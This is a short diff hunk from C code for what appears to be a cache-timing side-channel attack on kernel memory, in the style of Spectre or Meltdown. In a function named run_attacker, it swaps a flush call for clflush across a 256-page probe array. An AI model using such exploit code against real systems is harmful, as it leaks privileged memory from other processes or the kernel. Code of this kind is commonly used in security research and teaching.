@@ -57,7 +57,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         const uint64_t CACHE_HIT_THRESHOLD = 80;
         for (int attempt = 0; attempt < 1000; attempt++) {
             for (int i = 0; i < 256; i++) {
-                flush(&shared_memory[i * 4096]);
+                clflush(&shared_memory[i * 4096]);
             }
             call_kernel_part1(kernel_fd, shared_memory, current_offset);
             for (int i = 0; i < 256; i++) {
